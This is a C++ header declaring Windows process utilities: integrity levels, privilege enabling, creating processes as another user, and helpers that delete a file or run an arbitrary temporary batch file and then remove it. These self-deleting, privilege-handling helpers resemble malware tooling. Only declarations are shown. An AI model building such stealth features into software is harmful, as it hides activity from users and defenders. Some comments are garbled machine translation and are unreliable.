#pragma once

//Current process ID.
#define CURRENT_PROCESS ((HANDLE)-1)

namespace Process
{
  //The application layer.
  enum
  {
    INTEGRITY_UNKNOWN,
    INTEGRITY_LOW,     //Untrusted (Process can only write to low integrity locations, such as the Temporary Internet Files \ Low folder or the HKEY_CURRENT_USER \ Software \ LowRegistry key)
    INTEGRITY_MEDIUM,  //User (Process can create and modify files in the user's Documents folder and write to user-specific areas of the registry, such as HKEY_CURRENT_USER.)
    INTEGRITY_HIGH     //Administrative (Process can install files to the Program Files folder and write to sensitive registry areas like HKEY_LOCAL_MACHINE.)
  };
  
  //Flags for showShellRunDialog ().
  enum
  {
    RFD_NOBROWSE        = 0x00000001, //Do not display the Browse button.
    RFD_NODEFFILE       = 0x00000002, //Do not choose the default file.
    RFD_USEFULLPATHDIR  = 0x00000004, //Ispolzolvat working directory path from the executable file (ignariruetsya at workingDir! = NULL).
    RFD_NOSHOWOPEN      = 0x00000008  //Do not display the label for Edit'a.
  };

  
  void init(void);

  
  void uninit(void);
  HMODULE _getModuleHandle(HANDLE process, LPWSTR moduleName);


  TOKEN_USER *_getUserByProcessHandle(HANDLE process, LPDWORD sessionId);

 
  TOKEN_USER *_getUserByProcessId(DWORD id, LPDWORD sessionId);

  DWORD _getCountOfThreadsByProcessId(DWORD id);

 
  bool _enablePrivilege(LPWSTR privilegeName, bool enable);

  BYTE _getIntegrityLevel(HANDLE process);

#if !defined _WIN64
  bool _isWow64(HANDLE process);
#endif

  DWORD _create(const LPWSTR module, const LPWSTR commandLine, const LPWSTR workDir, const STARTUPINFOW *starupInfo, PROCESS_INFORMATION *pi);

  
  DWORD _createEx(const LPWSTR module, const LPWSTR commandLine, const LPWSTR workDir, const STARTUPINFOW *starupInfo,  PROCESS_INFORMATION *pi);


  
  DWORD _createAsUser(HANDLE token, const LPWSTR desktop, const LPWSTR module, const LPWSTR commandLine, const LPWSTR workDir, const STARTUPINFOW *starupInfo, PROCESS_INFORMATION *pi);

  DWORD _createAsUserEx(HANDLE token, const LPWSTR desktop, const LPWSTR module, const LPWSTR commandLine, const LPWSTR workDir, const STARTUPINFOW *starupInfo, PROCESS_INFORMATION *pi);

  
  void _closeProcessInformation(PROCESS_INFORMATION *pi);
  
  
  DWORD _createThread(SIZE_T stackSize, LPTHREAD_START_ROUTINE startAddress, LPVOID parameter);

  /*
    Вызов стандартного дилалога запуска (RunFileDlg).

    IN owner      - родитель, может быть NULL.
    IN workingDir - рабочая директория, может быть NULL.
    IN title      - заголовок диалога, может быть NULL для значения по умолчанию.
    IN promt      - текст диалога, может быть NULL для значения по умолчанию.
    IN flags      - флаги RFD_*.
  */
  void _showShellRunDialog(HWND owner, const LPWSTR workingDir, const LPWSTR title, const LPWSTR promt, DWORD flags);

  /*
    Удаление файла через батник.

    IN fileForRemoving - полное имя файла для удаления.

    Return             - true - в случаи успеха,
                         false - в случаи ошибки.
  */
  bool _runBatchForRemoveFile(const LPWSTR fileForRemoving);

  /*В В В В Run the bat-file with proizvolnym content and its posleduschego removal.

В В В В IN context - the contents of the file encoded in OEM, will add an extra perfiksy and
В В В В В В В В В В В В В В В В В postfix.
В В В В 
В В В В Return - true - if successful,
В В В В В В В В В В В В В В В В В false - if an error occurs.
В В */
  bool _runTempBatch(const LPSTR context);
};
